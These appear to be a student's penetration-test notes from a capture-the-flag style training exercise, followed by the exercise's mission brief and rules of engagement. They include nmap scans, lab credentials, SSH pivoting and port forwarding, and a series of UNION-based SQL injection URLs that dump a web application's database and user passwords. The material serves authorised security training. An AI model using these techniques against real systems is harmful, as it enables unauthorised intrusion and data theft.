    10.50.23.155 22/80
______________________________________________________________________________________________________________
## First nmap the ip (notice http is running use enum script for more pages)
### Second nc the ports to validate them (obviously nc before the enum script to ensure its http)
    sudo nmap -T4 -Pn 10.50.23.155
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
    sudo nmap -T4 -Pn 10.50.23.155 --script=http-enum.nse
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-enum: 
|   /login.php: Possible admin folder
|   /login.html: Possible admin folder
|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
```
    nc 10.50.23.155 22
```
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
```
    nc 10.50.23.155 80
```
HTTP/1.1 400 Bad Request
Date: Fri, 06 Dec 2024 15:29:29 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 303
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 10.10.28.20 Port 80</address>
</body></html>
```
______________________________________________________________________________________________________________
## After scanning run firefox and enter ip in url
### From the results of the enum scan add the file paths to the end of the ip
    10.50.23.155/login.php
    10.50.23.155/login.html
    10.50.23.155/img/
    10.50.23.155/scripts/
______________________________________________________________________________________________________________
## Check all the different urls
### The script one looks promising
    system_user=user2
    user_password=EaglesIsARE78
______________________________________________________________________________________________________________
## SSH to the ip using the creds found
### Run /bin/bash to upgrade shell, do ip a/ip n/ip r to see what to ping sweep
    ssh -MS /tmp/jump user2@10.50.23.155
    
    for i in {1..30}; do (ping -c 1 10.10.28.$i | grep "bytes from" &); done
```
64 bytes from 10.10.28.4: icmp_seq=1 ttl=64 time=2.43 ms
64 bytes from 10.10.28.20: icmp_seq=1 ttl=64 time=0.018 ms
64 bytes from 10.10.28.30: icmp_seq=1 ttl=64 time=0.441 ms
```
______________________________________________________________________________________________________________
## Check known files on the system
### To see if there are any other networks we can scan
    cat /etc/passwd
    cat /etc/hosts
______________________________________________________________________________________________________________
## After finding the new network
### Set up dynamic port forward to start scanning
    ssh -S /tmp/jump jump -O forward -D9050
______________________________________________________________________________________________________________
## Scan the 192.168.28.181 discovered
### Followed by nc to validate ports
    proxychains nmap -T4 -Pn 192.168.28.181 -p-
```
Nmap scan report for 192.168.28.181
Host is up (0.00055s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 36.44 seconds
```
    proxychains nc 192.168.28.181 22
```
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
```
    proxychains nc 192.168.28.181 80
```
HTTP/1.1 400 Bad Request
Date: Fri, 06 Dec 2024 18:13:17 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 306
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 192.168.28.181 Port 80</address>
</body></html>
```
______________________________________________________________________________________________________________
## Set up a tunnel through the MS you already have to access the SSH/HTTP ports
### If you regularly SSH'd into the box close it and look for the SSH -MS command above
    ssh -S /tmp/jump jump -O forward -L20001:192.168.28.181:22 -L20002:192.168.28.181:80
______________________________________________________________________________________________________________
## Now can run firefox to connect to the webserver
### Utilize the port forward we made in the above and use loopback
    firefox http://127.0.0.1:20002
______________________________________________________________________________________________________________
## Now once on the webpage observe the "Product Selections"
### Only need to select one and then change the number to see which field is vulnerable
    http://127.0.0.1:20002/pick.php?product=7 OR 1=1        #the vuln field because displays everything
______________________________________________________________________________________________________________
## After finding the vuln field we can check how many fields there are
### Simply by dropping the OR statement and swapping with UNION SELECT 1,2,3 (increment until errors)
#### also notice for this there are only 3 fields, but they are out of order so adjust to match below
    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT 1,3,2
______________________________________________________________________________________________________________
## Once we know the order of the fields we can set up our Golden Statement
### In original it goes table_schema,table_name,column_name but we need to switch the 2 and 3 field
    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
______________________________________________________________________________________________________________
## Once we get the output which will be the entire database we can now narrow the search
### By doing this we can view any data inside we want based on the filters below 1,3,2
    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT id,3,name FROM siteusers.customer
    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT account,3,category FROM siteusers.customer
    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT description,3,2 FROM siteusers.customer
    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT id,3,quantity FROM siteusers.net_products
    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT product,3,price FROM siteusers.net_products
    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT id,3,quantity FROM siteusers.purchase_history
    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT product,3,account FROM siteusers.purchase_history
    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT id,3,ordernumber FROM siteusers.shippingdates
    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT account,3,date FROM siteusers.shippingdates
    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT user_id,3,name FROM siteusers.users
    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT username,3,2 FROM siteusers.users
All possible combo's the last one is the most promising ;)

    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT username,3,user_id FROM siteusers.users
______________________________________________________________________________________________________________
## From the last golden statement we tried we got usernames and possible passwords
### Placing them below to test which ones work
    Aaron    ncnffjbeqlCn$$jbeq
    user2    RntyrfVfNER78
    user3    Obo4GURRnccyrf
    Lroth    anotherpassword4THEages
______________________________________________________________________________________________________________
## NONE OF THE SSH WORKS
### So take your happy ass back to the first box and scan that network ^^
    for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
______________________________________________________________________________________________________________
## 
### 

______________________________________________________________________________________________________________
## 
### 

______________________________________________________________________________________________________________
## 
### 

______________________________________________________________________________________________________________
## 
### 

______________________________________________________________________________________________________________
## 
### 

______________________________________________________________________________________________________________
## 
### 

______________________________________________________________________________________________________________
## 
### 

______________________________________________________________________________________________________________
## 
### 

______________________________________________________________________________________________________________
## 
### 

______________________________________________________________________________________________________________
## 
### 

______________________________________________________________________________________________________________
## 
### 

______________________________________________________________________________________________________________
## 
### 

______________________________________________________________________________________________________________
## 
### 

______________________________________________________________________________________________________________
# OPERATION: DRY RUN

## SITREP: This is a dry run operation to prepare you for tomorrow's real operation. You will be provided with a mission task sheet, RoE, and scope.

### Maintain 'low visibility' on the wire, as security products may be in place, and document your actions and results as you will be expected to provide OpNotes at the end of the operation.

#### Take notes on this document.

#### Dry Run Operation
#### XX June 2024
#### Start Time: 0830
#### Duration: 3 hours

### Type of Operation: Information Systems Penetration Test

### Objective:Actively exploit and attack networked information systems for the purposes of identifying and reporting vulnerabilities.

### Tasking:Perform all tasks outlined in this document.

## Mission Scope:

#### All public facing systems of target entitiy excluding devices responsible for networking (routers, switches, etc). Known web address will be supplied out of band.

#### Internal network of target entity excluding devices responsible for networking (routers, switches, etc)
__________________________________________________________________________________________________________________
## RoE:

#### Google docs, and all other shareable document platforms, are forbidden during this operation.

#### All communication platforms and applications, such as Slack or Gmail, are forbidden during this operation.

#### You are authorized to modify passwords to user accounts.

#### Writing to disk is authorized on all machines.

#### You will not destroy data/systems, perform DoS, or otherwise disrupt business operations of any entity during this penetration test.

#### You will not use Metasploit tools for any affect with the exception of shellcode generation.

#### You will not target routers, switches or other networking devices.

#### You will not target entities or systems outside of the scope previously defined.

#### You will not interfere with other entities' operations in any way.

#### Prior Approvals: OSINT through publicly available resources. Scrape appropriate web content that will provide operational data. Testing of found credentials. NOT approved to change routing or destroy data.
__________________________________________________________________________________________________________________
# |
# |
__________________________________________________________________________________________________________________
## CCTC Security
### OPERATION Dry Run

### 23 JANUARY 2020 / 0800 / CTF 109 
### Tasking
### All actions must be in accordance with mission brief, scope, and RoE.
### Complete the taskings on each referenced target below.
### Each heading is the hostname of a target. The first listed target’s hostname is “PublicFacingWebsite”.

## PublicFacingWebsite
### Perform Reconnaissance 
    1. Find all information about, and contained within, the target system to include potential phishing targets, website directory structure, and hidden pages.
    2. Actively scan and interact with target to find potential attack vectors.
### Attempt Exploitation || Gain Initial Access
    1. Use information gained from reconnaissance to gain access to the system.
### Find Additional Targets
    1. Perform post-exploitation tasks (situational awareness, localhost enumeration, etc).
    2. Discover additional targets through analysis of information from post-exploitation tasks.
### Pivot to Found Targets
    1. Pivot through network to other targets as you find them.
__________________________________________________________________________________________________________________
## BestWebApp
### Perform Reconnaissance
    1. Find all information about, and contained within, the target system to include potential phishing targets, website directory structure, and hidden pages.
    2. Actively scan and interact with target to find potential attack vectors. 
### Attempt Exploitation
    1. Attempt to retrieve privileged information from the target by using information found in reconnaissance. Reconnaissance from other targets within the network may have information relevant to any target.
__________________________________________________________________________________________________________________
## RoundSensor
### Perform Reconnaissance
    1. Actively scan and interact with target to find potential attack vectors.
### Attempt Exploitation || Gain Initial Access
    1. Use information gained from reconnaissance to gain access to the system. Reconnaissance from other targets within the network may have information relevant to any target.
### Find Additional Targets
    1. Perform post-exploitation tasks (situational awareness, localhost enumeration, privilege escalation, etc).
    2. Discover additional targets through analysis of information from post-exploitation tasks.
### Pivot to Found Targets
    1. Pivot through network to other targets as you find them.
__________________________________________________________________________________________________________________
## Windows-Workstation
### Perform Reconnaissance
    1. Actively scan and interact with target to find potential attack vectors.
### Attempt Exploitation || Gain Initial Access
    1. Use information gained from reconnaissance to gain access to the system. Reconnaissance from other targets within the network may have information relevant to any target.
### Find Additional Targets
    1. Perform post-exploitation tasks (situational awareness, localhost enumeration, privilege escalation, etc).
    2. Discover additional targets through analysis of information from post-exploitation tasks.
### Pivot to Found Targets
    1. Pivot through network to other targets as you find them.
__________________________________________________________________________________________________________________
